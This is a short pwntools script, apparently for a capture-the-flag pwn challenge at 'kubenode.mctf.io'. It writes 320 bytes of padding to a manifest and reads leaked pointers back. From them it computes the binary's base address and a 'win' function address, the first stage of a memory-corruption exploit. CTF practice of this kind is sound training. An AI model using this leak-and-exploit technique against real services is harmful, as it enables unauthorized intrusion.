from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

recv_menu()
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'10')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'32')
p.recvuntil(b'data:\n')
p.send(b'A' * 320)
recv_menu()

p.sendline(b'3')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Validator    : ')
validator = int(p.recvline().strip(), 16)
p.recvuntil(b'Checkpoint   : ')
checkpoint = int(p.recvline().strip(), 16)

base_addr = validator - 0x136c
win_func = base_addr + 0x14a8
print(f"Base address: {hex(base_addr)}")
print(f"Win function: {hex(win_func)}")
print(f"Checkpoint difference: {checkpoint - win_func}")

p.close()
